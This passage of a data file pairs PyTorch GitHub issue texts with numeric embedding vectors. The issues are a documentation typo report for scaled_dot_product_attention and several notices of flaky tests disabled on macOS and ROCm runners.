  3.21384817e-01 -4.17038426e-02 -1.49484590e-01 -2.44684979e-01
 -8.72403681e-02  3.77479970e-01 -2.80658543e-01 -9.38092172e-02
  1.05724283e-01  4.37146686e-02 -1.51768535e-01  1.18558139e-01
  3.43258619e-01  1.52789235e-01  2.57623196e-01  2.54454494e-01
  1.41975746e-01  2.73375399e-02 -2.36534089e-01 -9.48956087e-02
  7.75730610e-02  1.38777569e-01  2.83055156e-01 -4.19394702e-01
 -4.02546287e-01  1.89199790e-01 -3.55135113e-01 -2.38401100e-01
 -1.70765102e-01  4.70536500e-02 -3.51144612e-01  1.32410496e-01
 -1.50823861e-01  7.64477253e-02  3.88441503e-01  2.68510938e-01
  1.02663666e-01 -3.08573037e-01  8.24560672e-02 -2.53918953e-03
 -2.50965893e-01  3.64715904e-01 -5.67205809e-02  3.42753947e-01
 -1.21278234e-01 -1.01809666e-01 -3.20000917e-01  1.23790681e-01
  2.05314785e-01 -1.25161991e-01  6.74256831e-02 -5.20261049e-01
  5.33274412e-01  2.67107993e-01  9.40228850e-02 -9.57630947e-02
 -5.59894443e-02 -1.88565314e-01  2.03873031e-04 -5.05130053e-01
  1.84066027e-01  2.93177038e-01 -1.53950781e-01 -1.93975061e-01
  2.34328032e-01 -3.78997535e-01 -2.33053580e-01  4.80894782e-02
 -3.23998302e-01 -8.60779732e-02  4.20106240e-02 -1.34611756e-01
  5.10861039e-01 -1.41367048e-01 -4.09974873e-01  1.71066523e-01
  3.46961260e-01 -2.09218517e-01  2.09271073e-01  2.81075016e-04
  3.11547935e-01  1.84174210e-01  4.80443656e-01  1.18063048e-01
 -2.15764135e-01  5.28971590e-02  2.44544446e-01 -1.74037702e-02
  5.00763595e-01 -3.80231857e-01  4.38980103e-01 -2.19653279e-01
 -1.84688121e-01  5.10783195e-02  1.95853233e-01 -3.01786214e-01
 -3.00226808e-01  2.30905563e-01  3.47889513e-01 -9.94544998e-02
 -2.29035579e-02 -1.62623018e-01 -1.10783666e-01  2.28476942e-01
 -5.93351498e-02  1.00175604e-01  4.60073352e-03 -1.12833001e-01
 -1.33613288e-01  2.16165408e-02  1.03724957e-01  6.17643520e-02
  1.41867250e-01  2.94441879e-01 -1.08612731e-01 -6.62005171e-02
 -2.60440052e-01  5.07811785e-01 -1.43132880e-01 -2.46544436e-01
  1.07251316e-01 -2.31527522e-01  6.50267303e-02 -4.20508027e-01
 -3.89333904e-01  6.42232448e-02  1.27540618e-01 -3.74093592e-01
 -1.34468421e-01  1.49241894e-01  1.05805539e-01 -2.24611938e-01
 -3.49975266e-02  4.91965026e-01  3.08292136e-02  3.82327437e-01
  2.85877526e-01 -1.42086307e-02 -2.09203929e-01  7.14515984e-01
  1.66395903e-01  5.58500178e-02 -1.50068045e-01 -4.61871356e-01
 -1.15035653e-01  2.03541860e-01  9.69047844e-02 -2.41553336e-02
 -8.84513855e-02  2.31213897e-01  1.85614526e-01  5.95594570e-02
  2.82839350e-02  1.45668581e-01  2.83642232e-01  7.62686087e-03
 -1.29750967e-01 -5.70649058e-02  2.09517300e-01 -9.34752524e-02
 -1.45917043e-01  3.12013924e-01 -3.71665299e-01 -2.13171899e-01]"
[Typo] about `scaled_dot_product_attention` doc oncall: transformer/mha,"https://pytorch.org/docs/stable/generated/torch.nn.functional.scaled_dot_product_attention.html

![image](https://github.com/pytorch/pytorch/assets/46072190/bd2f183b-4cb4-422e-9dd3-e18c981ca7bc)

There seems to be a typo here, it should be 'attn_bias.masked_fill_(attn_mask.logical_not(), float(""-inf""))' ?

cc @jbschlosser @bhosmer @cpuhrsch @erichan1 @drisspg @mikaylagawarecki",False,"[-3.21290672e-01  9.28172618e-02 -1.65025592e-01  6.89779222e-02
 -1.22266680e-01 -3.23545307e-01  3.09089124e-01  1.37796208e-01
 -2.53204018e-01  8.82614106e-02 -2.13303231e-03 -1.66094184e-01
  7.12357312e-02  1.62574887e-01 -2.10070670e-01  2.09360003e-01
 -7.27075785e-02  1.61443129e-01 -3.94192100e-01 -9.49212611e-02
  2.83527464e-01 -1.67176113e-01 -2.65320577e-02  6.72270805e-02
 -1.01887040e-01  1.52313262e-01 -9.89358574e-02 -1.36057764e-01
 -8.50610882e-02  1.97129250e-01  8.40122811e-03  1.12241149e-01
 -2.57823825e-01 -1.39649391e-01 -5.49446568e-02  7.30434135e-02
 -4.78227288e-02  1.31416246e-01 -5.40965050e-02 -2.64017284e-01
 -1.01354182e-01  8.38806629e-02 -1.37080746e-02  3.61164272e-01
 -4.55099763e-03 -6.54480979e-02 -5.95989898e-02  6.70127720e-02
 -3.80810261e-01 -4.04923707e-02 -1.09915733e-01 -2.47633249e-01
 -4.00301993e-01 -1.79357201e-01  1.00508630e-01 -2.27061156e-02
  4.34472561e-02  5.28164171e-02  3.10800195e-01 -6.90568909e-02
  2.50559300e-01 -1.50123343e-01  1.48269311e-01  3.37010443e-01
 -1.67353414e-02  2.47810408e-01 -1.31743982e-01 -5.35166264e-01
 -5.01605943e-02  1.40288860e-01  1.32795051e-01 -2.07567677e-01
  1.57771274e-01 -2.79870927e-01  4.46920216e-01 -1.36506557e-01
 -2.45601371e-01  3.02278191e-01 -1.19220190e-01 -3.21525037e-01
  1.17209375e-01 -1.98515207e-01  5.43646030e-02  3.00837122e-02
  4.09542173e-02  2.08101019e-01  7.95636103e-02 -9.02342424e-02
  2.51868248e-01 -2.45014340e-01  2.56488696e-02  7.50224739e-02
  1.76339895e-02 -9.82441679e-02  3.03180981e-02 -5.96941896e-02
 -1.14170521e-01 -3.99893224e-01 -1.11730620e-01 -7.62747973e-02
 -2.37205192e-01 -1.26035050e-01 -3.72731984e-01  7.07074404e-02
  2.79920280e-01 -1.59813061e-01 -1.52247604e-02  3.96320373e-01
  1.38235584e-01  3.62417340e-01  2.71955431e-01 -3.68138775e-04
 -1.81589574e-02  2.24768043e-01  1.49900783e-02 -3.06863308e-01
  9.00814496e-03 -1.20146044e-01 -1.66655287e-01  1.60452947e-01
  3.42563510e-01  1.63931489e-01 -1.58149406e-01  1.86980888e-02
  1.76837742e-01 -7.60932267e-03  7.79372007e-02  3.93488467e-01
 -2.08513409e-01  1.77957371e-01  4.16886508e-02 -1.56448707e-02
  2.21440285e-01  1.42743886e-01  4.14424855e-03  3.81984748e-02
 -2.38448322e-01 -2.06822515e-01 -4.30713333e-02  5.82552850e-02
 -4.06518459e-01  5.74007511e-01  2.50047237e-01 -1.89251900e-01
  1.34462178e-01  1.65659636e-01 -4.59269464e-01 -1.23054542e-01
 -1.73278581e-02  1.59940600e-01 -2.10651189e-01 -1.28381439e-02
 -1.28419802e-01  2.67397642e-01 -1.38811283e-02  1.72405690e-01
  9.30609107e-02 -1.24272406e-02 -1.75836354e-01 -1.22347429e-01
  6.16156273e-02  7.09796697e-02 -1.36311501e-02  1.64079532e-01
 -2.18557656e-01 -1.62581921e-01 -1.38125315e-01 -8.97272080e-02
 -3.25641125e-01  1.26882821e-01  1.41245052e-01 -8.05027187e-02
 -1.80182770e-01  6.93987086e-02  3.33653297e-03  9.94900316e-02
 -1.70026153e-01 -1.37456968e-01 -2.76015103e-01  2.08924115e-01
  1.80599719e-01 -2.86224224e-02  1.58001751e-01 -1.34043887e-01
 -2.68001318e-01  1.64707631e-01  2.13787690e-01  3.14960480e-01
 -2.52076924e-01 -2.51148582e-01 -1.69843286e-01 -1.00554656e-02
  1.33129135e-02 -4.74003889e-02 -4.64277565e-02 -2.44318228e-02
  2.97683537e-01 -1.09521421e-02  1.28474176e-01  1.81722119e-01
 -8.77419561e-02  4.92229313e-02  1.57792829e-02 -1.47605404e-01
  7.74811432e-02  1.73593849e-01 -1.80939555e-01 -2.70707518e-01
 -1.62027732e-01  1.20601103e-01 -2.34283596e-01 -4.99897420e-01
 -3.05338591e-01 -2.28174090e-01  1.62096202e-01  2.70803690e-01
 -2.42296353e-01  6.02542087e-02 -1.62341017e-02  2.67619461e-01
 -7.69034624e-02 -1.40348107e-01 -3.46628070e-01 -4.20044303e-01
 -2.42590457e-01 -9.37781185e-02  3.94499153e-02  1.37493312e-01
 -3.09386373e-01  3.72921526e-02 -1.70175195e-01 -2.86372751e-01
  3.41243446e-01 -1.33263003e-02  6.24146685e-02  4.30977643e-01
 -2.76805997e-01 -2.82841265e-01 -1.43946767e-01 -3.08788028e-02
  1.10592932e-01 -1.69812530e-01 -5.17925397e-02 -7.67614245e-02
  1.95249431e-02  3.17209922e-02 -5.32043576e-01  2.28511155e-01
  4.90618311e-03  3.10750753e-01 -2.86640197e-01 -1.32986441e-01
 -1.23255653e-02 -1.45371631e-02 -5.71244881e-02  6.70964420e-02
  1.00924604e-01 -1.26925945e-01  2.51968205e-01 -3.42786610e-02
  2.18037874e-01 -1.52197048e-01 -1.92441434e-01  3.97949308e-01
  1.96020782e-01 -1.42161641e-02 -2.62552202e-01  9.99503210e-02
 -1.72015131e-01 -2.19584852e-01  2.17607826e-01 -2.47182503e-01
  2.42626041e-01  6.05903305e-02  2.39665657e-01 -1.27791390e-01
  2.39014298e-01 -1.65828422e-01 -4.50635135e-01  1.47674114e-01
  2.21748292e-01  2.35299915e-02 -3.12910415e-02  9.01478603e-02
  6.98938780e-03 -1.52452469e-01  8.24346766e-02 -4.52045724e-02
 -1.76574558e-01 -2.12596148e-01  1.26326412e-01  1.96661562e-01
  4.79502410e-01 -1.65830359e-01  2.60077357e-01 -7.68414214e-02
  2.42380779e-02 -1.67721093e-01  1.48682863e-01 -1.84953138e-01
  2.73317993e-01  4.90780137e-02 -1.55832142e-01 -4.01412249e-02
 -1.05897874e-01  5.09045646e-02  1.92903012e-01  1.69816047e-01
  2.29579180e-01 -3.80997032e-01  2.27029528e-02  6.50235862e-02
  6.34764135e-02  2.80670941e-01 -1.32821351e-01  2.66635835e-01
 -3.41411710e-01  4.18413818e-01  7.03470549e-03  2.85254002e-01
  8.50298405e-02 -2.94953212e-02 -1.17392518e-01  1.47493348e-01
  2.01176673e-01 -2.23366201e-01 -1.08595314e-02  4.23164740e-02
 -2.60643631e-01 -2.80377507e-01  1.92541555e-01  9.71449465e-02
 -2.92152688e-02 -4.53048237e-02  3.07894368e-02  1.98510289e-01
 -1.63158357e-01  2.07321614e-01 -1.28604174e-01 -4.55949269e-02
 -2.55522132e-01 -2.08718807e-01  2.28885263e-01 -2.75623739e-01
 -3.46243322e-01  8.75781178e-02  5.46266213e-02  4.51857507e-01
  5.22527285e-02  1.35994226e-01  5.92965424e-01  4.27005589e-01
 -8.09264928e-02  2.04760358e-01  5.50479442e-02  3.04861199e-02
  1.30963102e-01  4.46631253e-01  2.05508769e-01  2.90141344e-01
 -1.31363377e-01 -7.05771595e-02 -1.23477913e-01  4.02148068e-01
  3.64925861e-02  3.99833769e-02  1.43482268e-01  4.27689329e-02
 -1.58171192e-01  1.84295624e-01 -1.71040952e-01  3.63343835e-01
 -4.85305339e-02  9.08296406e-02  8.51068273e-02 -3.08241546e-01
  3.83692265e-01 -1.62585467e-01 -1.00299396e-01  1.18520096e-01
  3.10350657e-01  1.04554817e-01  2.02339783e-01  4.43411991e-04]"
DISABLED test_modules_can_be_imported (__main__.TestPublicBindings) module: autograd triaged module: flaky-tests module: macos skipped,"Platforms: mac, macos

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/failure/test_modules_can_be_imported) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17582280667).

Over the past 72 hours, it has flakily failed in 6 workflow(s).

**Debugging instructions (after clicking on the recent samples link):**
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Grep for `test_modules_can_be_imported`


Test file path: `test_public_bindings.py`

cc @ezyang @albanD @zou3519 @gqchen @pearu @nikitaved @soulitzer @Lezcano @Varal7 @malfet",False,"[-0.17501432 -0.18225518  0.00583341  0.0142569   0.23773623 -0.19519654
  0.18885306 -0.06213431 -0.59114206 -0.30369607  0.26398984 -0.10879686
  0.17147109  0.09485301 -0.2610277   0.01248579 -0.4111352  -0.15975796
  0.2591452   0.08655865 -0.1366416  -0.13113782 -0.09162699  0.08664358
  0.01070354  0.05954906  0.00105935 -0.06067968 -0.19694872  0.10019597
  0.04065215  0.27310917 -0.44859278  0.04827726  0.63093156  0.21418318
  0.04012807 -0.3320604  -0.298112   -0.4371658  -0.05075428 -0.07913872
  0.06563772  0.01510872  0.14353734 -0.05246105 -0.08826976  0.06050383
 -0.15183762  0.13594136  0.11289161 -0.17361617 -0.0292782  -0.60468084
  0.1922946  -0.01406165  0.27771977  0.29339772  0.27816355  0.3783904
  0.04377989 -0.02243542 -0.06990295  0.20285209  0.0628752  -0.00771748
  0.00219727 -0.13982287  0.25708327 -0.07221412  0.17043597  0.01573866
 -0.47485545  0.10278232  0.1778602   0.15703376 -0.2344573  -0.18074986
 -0.0584114   0.06453802 -0.13059905  0.15824033  0.26836908 -0.12393216
  0.25792933 -0.04016191 -0.04820082 -0.13063353 -0.00233424 -0.05176848
  0.4798031  -0.03727737  0.02028298  0.20289455  0.08461539 -0.02113982
  0.4821983   0.05219466 -0.17622948  0.00836104  0.21467768 -0.24869922
 -0.08755258  0.13934147 -0.2485984  -0.08015832  0.501086   -0.0932389
  0.32617837 -0.1985791  -0.11354043  0.09985142  0.009288    0.11989495
 -0.13846621  0.06186286 -0.20744336 -0.01581318  0.09342372  0.7242281
 -0.10683202 -0.14362785  0.27053112 -0.0541938   0.29917976 -0.06632407
 -0.04294284  0.30322218 -0.14563996 -0.20550495  0.12481162  0.10930631
 -0.03777972 -0.14827849  0.21998882  0.05057275 -0.2785204  -0.4121915
 -0.0334366  -0.01653688 -0.59564507  0.35648048  0.30848742 -0.00793644
  0.18825862 -0.23736258 -0.11863694  0.27469683 -0.17415634 -0.06297456
  0.34229967 -0.09632307 -0.20609799  0.53232473  0.12098312  0.21335775
  0.5490679   0.2335645  -0.26041782 -0.31323338  0.03240857  0.42470652
 -0.2654194   0.17389378  0.14636916 -0.03460012 -0.4867121   0.03600637
 -0.25322807  0.03723029 -0.02342245  0.0169168   0.24053364 -0.23053643
  0.02698088 -0.26148438  0.06669615 -0.14344889 -0.22872365  0.28737044
 -0.00396373 -0.03364506 -0.11664404  0.1707221   0.04358395  0.3126002
 -0.12880719 -0.10343839  0.04012223  0.22421438 -0.26960143  0.14598234
  0.12207584 -0.03341698  0.04714348 -0.27669775 -0.00897607 -0.16901116
  0.00915598  0.09773552 -0.19888377  0.1391118   0.26604134 -0.1986391
 -0.11538889  0.07206392 -0.10879228 -0.3514704   0.0828802   0.11796606
 -0.29720923 -0.01826329  0.09862646 -0.34865454 -0.14287384  0.2964028
  0.24415112 -0.05094009  0.15711248  0.1495046  -0.34461915 -0.29227817
 -0.19067326 -0.23615819  0.06964708 -0.10554597  0.06276824  0.23754334
 -0.3636212  -0.01818676 -0.20815177 -0.06318845  0.29522014  0.00567167
  0.23475893  0.03636817  0.166228   -0.28110874 -0.00159234  0.50313044
 -0.34475136 -0.01995168 -0.07688457 -0.0552872   0.01059135  0.205868
 -0.04102767 -0.29105455 -0.31104854  0.05944909 -0.16756788 -0.23188165
  0.26805985  0.16262743  0.16495922  0.3233665  -0.08804566  0.04510532
  0.11658966 -0.09387304  0.19101425  0.30912513 -0.0530169   0.33946216
  0.17397945  0.19997041 -0.21088144 -0.0234599   0.09945765 -0.12823766
  0.16630232 -0.4283891   0.35472956  0.09658094  0.2625468   0.00473572
  0.17672342 -0.26148516 -0.0272966   0.02826025  0.04015763  0.18622878
 -0.15457226  0.37707373 -0.0286376  -0.06288831  0.03116755 -0.44606906
 -0.3311825  -0.05000805 -0.08943898  0.15944386  0.30927986 -0.05768303
 -0.12339604  0.29243076  0.05938926 -0.31237596  0.01659695  0.00132157
 -0.24073571  0.34183574  0.08428859 -0.4806947   0.27551323 -0.12782884
  0.13175993  0.17373198  0.33266768 -0.5136972   0.12184162  0.06865465
 -0.01920332  0.24987805  0.3263076  -0.10574241 -0.33255744  0.37020537
  0.08068423  0.11130663  0.04492854  0.08739291 -0.52415836  0.09544452
  0.04581993  0.05774217 -0.36236507 -0.07132608  0.03667809  0.01633326
 -0.00316665  0.10914002 -0.26443177  0.07660556 -0.25135085  0.11349373
 -0.14986892  0.49387702  0.14745906 -0.24981926  0.04639102 -0.02269098
  0.20928055  0.09168185 -0.23216583 -0.16635504  0.13866127  0.05938144
  0.32076824 -0.04658024 -0.13875285 -0.002264   -0.62809885  0.10075916
  0.06309557  0.3163998   0.15333539  0.04143464  0.18745261  0.3636838
 -0.45513976 -0.43745738 -0.51864564 -0.26342446 -0.0580926  -0.07837781
 -0.33581942 -0.00409858 -0.13972883  0.09467956 -0.3836803   0.01325898
 -0.3347684   0.10758406  0.32445252 -0.05408111  0.24482262 -0.19923264
 -0.05339063  0.0206502  -0.01580787  0.14735413  0.16667426  0.01445099]"
DISABLED test_cublas_baddbmm_large_input_1_10000_10000_10000_cuda_float16 (__main__.TestMatmulCudaCUDA) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-0.04471768 -0.04715751 -0.13588777  0.02485465 -0.05438927 -0.26324293
  0.20785022  0.08761405 -0.4735733  -0.09315826  0.26642528 -0.32297605
  0.13667515  0.08194477 -0.45751303 -0.02475831 -0.02688189 -0.08268802
  0.20826727  0.08269879 -0.13917021 -0.0785583  -0.4146846   0.09979708
 -0.29366076  0.28725612 -0.23713547 -0.03755514 -0.20018792  0.07126246
  0.09739399  0.11099613  0.289663   -0.05174332  0.27961624 -0.1446822
 -0.29901546 -0.2812345  -0.18654945 -0.08296473 -0.04598108 -0.10324514
 -0.03699638  0.12584642 -0.07570234  0.01550148 -0.08532402  0.17355448
 -0.01514128 -0.12032495  0.19166525 -0.13032247 -0.10169756 -0.3117113
 -0.06174528  0.06994183  0.2445471   0.2775941   0.23326556  0.42502517
  0.12816845 -0.07664023 -0.16201904 -0.0305305   0.053105    0.26237905
 -0.03806738 -0.21642248  0.3346128   0.2266446  -0.05374769  0.12027734
 -0.1025932   0.23724942  0.16477168  0.41207394 -0.06980132 -0.08028372
 -0.20439602 -0.14646706 -0.3196944   0.00324759 -0.06162007 -0.40529972
  0.42371562 -0.21717046  0.01758972 -0.05378902 -0.00667559 -0.25556135
  0.2509163   0.21245071  0.04729672  0.02719708 -0.02219302 -0.11025132
 -0.02019248 -0.13196146 -0.39292806  0.10515583  0.09294485 -0.10364838
 -0.24445334  0.2783904  -0.46909958 -0.16966492  0.12539399 -0.22634926
 -0.095926    0.33673412  0.16532558 -0.03402425 -0.10365485  0.3975585
  0.07886936  0.0877474  -0.1861541  -0.32455486 -0.147893    0.36930755
 -0.25410047 -0.4496895   0.05234317  0.02908809  0.19955799 -0.14801913
 -0.02449044  0.16371523 -0.07102688 -0.03212959 -0.04453817 -0.12839948
  0.10070379  0.01621709 -0.31777066  0.12831084  0.01096999 -0.12375565
  0.11777906  0.23488036 -0.24979554  0.28898534  0.00432644 -0.13489032
  0.28881145  0.07364757 -0.3345542   0.24261348  0.13972273  0.14245671
  0.15404493 -0.18281583  0.08865317  0.79918563 -0.036899   -0.01929692
  0.48345524  0.13011976 -0.21426465 -0.29302448 -0.04451017  0.0174336
 -0.00153961 -0.05118218  0.2969035  -0.04524293 -0.37195015  0.07811034
 -0.01712725  0.24867259  0.14689386  0.24081685  0.16480392  0.0099782
  0.09139642 -0.32210448  0.12304431 -0.23548916 -0.12539807  0.05420783
 -0.08859338  0.12500213  0.63513505 -0.06130827 -0.15390006  0.18060857
  0.03615391  0.08531433  0.01518554 -0.06243517 -0.31030154  0.1344688
  0.00857639  0.01231652 -0.31975025 -0.18495707 -0.14400733 -0.24174398
  0.07854962 -0.01526303 -0.0386415   0.10790575 -0.0720439  -0.31590617
 -0.00734457  0.06884038 -0.13742733 -0.45782495  0.24781603  0.1797413
 -0.18193966 -0.36428797 -0.20509683 -0.12699193 -0.02369991  0.10689329
 -0.10773593  0.04600601 -0.28649178  0.11790805  0.03282089 -0.23392533
 -0.07994184 -0.28143823 -0.37730718 -0.09174198  0.09977408  0.0603385
 -0.01128925  0.0908156   0.07319375 -0.10156977  0.03090113 -0.05356376
  0.12984537 -0.01822926 -0.26974547 -0.17430416 -0.06357098  0.16655073
 -0.05232618 -0.21211128 -0.27635965  0.00173333  0.06597927  0.40026292
 -0.28592354  0.07260116 -0.30915153  0.08338872  0.0769489  -0.09062564
  0.05293286  0.16845918 -0.157437    0.18545675  0.03167697 -0.01456963
  0.21060725 -0.06340368  0.38449955  0.3892069  -0.27625358  0.6248533
  0.3936059   0.31019375 -0.29085165  0.06282248 -0.17129365  0.05388116
  0.03644282 -0.3980982   0.21872464 -0.02321523  0.28515962 -0.29030752
  0.46314055  0.11120059 -0.16547568  0.03393251  0.22472781  0.15532415
  0.08065747  0.15685987  0.22576836 -0.16131777 -0.32361186 -0.42693797
 -0.27063268 -0.18863297  0.13557841  0.3645475   0.19856365  0.10050838
 -0.2720358   0.12410019  0.29223824  0.1584653   0.2767285  -0.01847435
 -0.36734945  0.04691667  0.14370498 -0.49506396 -0.1270054  -0.02191994
  0.05078905  0.28231493  0.39220804 -0.2723274  -0.00975569  0.08367899
  0.00568913  0.37464234  0.07413215  0.13624568 -0.08735546  0.17287256
  0.0529046   0.07943531  0.24609599 -0.2856441  -0.28352743  0.1137515
  0.10648572  0.08583936 -0.34687683 -0.15745601  0.00231631 -0.04563736
  0.10549082 -0.19431403 -0.12453246  0.05549155 -0.09172326 -0.07970213
  0.04537794  0.43535072  0.2977959  -0.3519981  -0.27432188  0.06542889
 -0.00490041 -0.12015389 -0.04487889 -0.05889434  0.35908478  0.45724925
 -0.14863724  0.19312808 -0.05441607  0.1790489  -0.00266541  0.06265878
  0.11738449  0.3514474   0.16599557  0.30364412  0.26177326  0.02178436
 -0.10947054 -0.02285086 -0.53606325  0.07925624  0.10530873 -0.15992463
 -0.13850157 -0.07424683  0.31767863  0.22676995 -0.4526297   0.17634209
 -0.06831712 -0.06826313  0.4279641  -0.2561224   0.42349312 -0.23695354
 -0.01288372  0.3298282   0.12721576 -0.20003492 -0.08353715 -0.06316978]"
DISABLED test_cublas_baddbmm_large_input_2_1000_1000_1000_cuda_float16 (__main__.TestMatmulCudaCUDA) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-3.93516682e-02 -5.90965003e-02 -1.29453808e-01  5.88301755e-02
 -5.16675711e-02 -2.55082846e-01  1.91385776e-01  1.03372514e-01
 -4.88982975e-01 -6.75813705e-02  2.67378777e-01 -2.53853261e-01
  9.97240767e-02  9.59669054e-02 -4.72857088e-01  1.73922144e-02
  1.00529753e-03 -4.86089140e-02  2.65223444e-01  5.28258272e-02
 -1.36152402e-01 -1.61984384e-01 -3.78986061e-01  1.18901461e-01
 -2.33181775e-01  2.97136217e-01 -3.22566807e-01  1.01815369e-02
 -1.84233963e-01  4.38824743e-02  1.06010251e-01  3.59894112e-02
  3.08739752e-01 -4.27599363e-02  3.56351078e-01 -8.29899460e-02
 -2.92012602e-01 -2.70363063e-01 -1.86300039e-01 -5.82245104e-02
 -1.70740150e-02 -1.59781829e-01 -2.94192769e-02  8.92703235e-02
 -9.19955522e-02  9.13983956e-03 -7.15621710e-02  1.23911910e-01
 -1.84724852e-03 -1.12521723e-01  2.12108582e-01 -1.30861342e-01
 -1.22705624e-01 -3.36844265e-01 -5.11269569e-02  9.69765782e-02
  2.53867418e-01  3.20544213e-01  2.21670419e-01  4.72554773e-01
  1.37794986e-01 -5.63975573e-02 -2.33076647e-01 -3.09188161e-02
  2.51207836e-02  2.31321067e-01 -5.14456183e-02 -2.54541337e-01
  3.00917566e-01  1.64192557e-01 -3.84338945e-03  1.15260273e-01
 -1.14271291e-01  2.47196123e-01  1.63590103e-01  4.43491191e-01
 -5.46552725e-02 -3.97407934e-02 -1.58246890e-01 -1.67412132e-01
 -2.96895444e-01  6.20879233e-04 -6.45225868e-02 -3.28897029e-01
  3.63796979e-01 -1.86700091e-01  3.21186222e-02 -2.79947370e-02
  1.15263499e-01 -2.37096786e-01  2.28606060e-01  2.02144116e-01
  4.66634594e-02  4.07087803e-03 -6.41000271e-03 -1.14918038e-01
  3.25689726e-02 -5.29521070e-02 -3.91965002e-01  9.09249187e-02
  6.61505908e-02 -1.51050240e-01 -2.63909191e-01  2.16590181e-01
 -4.82477427e-01 -1.59899056e-01  1.62753031e-01 -2.44259298e-01
 -8.15665275e-02  3.20616931e-01  1.54742241e-01  1.89773981e-02
 -1.23539969e-01  3.96299720e-01  5.24953231e-02  1.49385601e-01
 -2.24677473e-01 -3.12201321e-01 -2.15334252e-01  3.62835050e-01
 -2.14301169e-01 -4.43086565e-01  6.51870146e-02  3.08161862e-02
  1.67500973e-01 -1.54611349e-01 -1.21828774e-02  1.66064978e-01
 -3.49611901e-02  2.37567611e-02 -1.61400046e-02 -6.26585335e-02
  7.23160058e-02  1.52776903e-02 -3.62295061e-01  1.00463577e-01
  4.23262976e-02 -5.60639575e-02  9.80652347e-02  2.51401961e-01
 -2.52867401e-01  2.70795524e-01  2.88084317e-02 -1.05287328e-01
  2.63273120e-01  1.29123051e-02 -3.24823320e-01  2.67091572e-01
  1.94150716e-01  1.33484691e-01  1.19765922e-01 -1.52599558e-01
  7.69702643e-02  7.71813214e-01 -4.12092824e-03 -4.84675132e-02
  4.72227216e-01  1.62518263e-01 -2.24051088e-01 -2.62426555e-01
 -5.24214245e-02 -1.84799917e-03  3.64843309e-02 -5.02852760e-02
  2.63145566e-01 -6.88677356e-02 -3.89420122e-01  9.65730399e-02
 -1.02768257e-01  2.72315800e-01  1.22685120e-01  1.80338040e-01
  1.96163356e-01  2.03475319e-02  1.37454540e-01 -3.19108367e-01
  1.64740548e-01 -1.63147941e-01 -1.53857753e-01  3.06914300e-02
  2.71088183e-02  1.37433082e-01  6.45985723e-01 -6.19580075e-02
 -1.33455634e-01  1.90263182e-01  2.34166570e-02  8.56117308e-02
  2.87920181e-02 -5.09531721e-02 -3.59599680e-01  1.03463754e-01
  4.94868308e-02  4.94266450e-02 -2.87170917e-01 -1.87392086e-01
 -5.91625124e-02 -2.75603712e-01  6.81490153e-02  1.44881243e-02
 -4.24205959e-02  9.85893235e-02 -1.33000582e-01 -3.42083603e-01
 -7.16762803e-03  1.57490566e-01 -2.05967635e-01 -4.61353183e-01
  2.38419801e-01  1.37827009e-01 -1.64643064e-01 -3.99798334e-01
 -1.99142694e-01 -8.53136331e-02 -4.89643812e-02  6.70910627e-02
 -1.13873214e-01  1.22215688e-01 -2.94214100e-01  1.17642008e-01
  5.20307198e-03 -1.79462329e-01 -8.23084638e-02 -2.79322505e-01
 -3.54502797e-01 -1.01011589e-01  1.27446249e-01  3.92136909e-02
 -2.11450849e-02  1.01831779e-01  5.46399429e-02 -1.86042279e-01
  5.17008081e-02 -4.94300947e-02  1.02942020e-01 -3.53872553e-02
 -2.18492776e-01 -2.09424451e-01 -1.18561588e-01  1.47835821e-01
 -6.95189834e-02 -2.14905709e-01 -3.13610554e-01  3.91477086e-02
  6.57164454e-02  3.94817710e-01 -2.83991724e-01  1.28380075e-01
 -3.07470739e-01  1.28325894e-01  7.20106810e-02 -6.63122758e-02
  3.65474746e-02  1.54172167e-01 -1.87196195e-01  2.33038858e-01
 -1.24801435e-02 -8.85685906e-03  2.32460290e-01 -7.68195540e-02
  3.47236931e-01  4.06306386e-01 -2.40564957e-01  6.14509940e-01
  4.54915166e-01  3.04459274e-01 -3.02493513e-01 -1.77102089e-02
 -1.90252364e-01  4.67244536e-06 -7.75309280e-04 -4.43905443e-01
  2.24797159e-01 -4.63641956e-02  2.62151301e-01 -2.72780865e-01
  4.42587733e-01  1.24642178e-01 -1.22133523e-01 -1.66857727e-02
  2.37813041e-01  1.74696997e-01  3.78110148e-02  1.63527191e-01
  2.18189925e-01 -1.91244975e-01 -2.67394304e-01 -3.69249463e-01
 -2.53055304e-01 -1.44806117e-01  1.77083179e-01  2.83559412e-01
  1.96983129e-01  1.29671514e-01 -2.69827425e-01  6.49889112e-02
  2.86411881e-01  1.84292644e-01  2.51174659e-01 -2.82036923e-02
 -3.80585611e-01  3.40516567e-02  1.25583857e-01 -4.36737955e-01
 -1.06119804e-01 -5.76772392e-02  2.85933390e-02  2.62373298e-01
  4.31803375e-01 -2.46676698e-01 -3.05058658e-02  8.18917751e-02
  8.19420815e-03  3.61361504e-01  8.75696540e-02  1.52249992e-01
 -1.07999220e-01  1.14256635e-01  3.76100391e-02  4.47009057e-02
  2.35580325e-01 -2.71192014e-01 -2.56799042e-01  1.21066652e-01
  8.09929967e-02  1.80465467e-02 -3.86810899e-01 -1.55616120e-01
 -3.27125601e-02 -8.44002813e-02  1.17140621e-01 -2.15195850e-01
 -1.49742007e-01  5.12615517e-02 -4.09500301e-02 -1.06354147e-01
  4.42685559e-02  4.88974690e-01  2.75323689e-01 -3.85983825e-01
 -2.46043026e-01  1.78163350e-02 -3.87051478e-02 -9.53594595e-02
 -8.48397315e-02 -6.36340231e-02  4.27370250e-01  4.54697460e-01
 -1.63954899e-01  2.29495540e-01 -4.19798829e-02  1.51064634e-01
  1.06045697e-02  2.64087878e-02  1.19235255e-01  3.25656116e-01
  1.81186527e-01  2.95544922e-01  1.93745255e-01  5.91494367e-02
 -1.41344219e-01  5.70922941e-02 -5.77617347e-01  5.45367599e-02
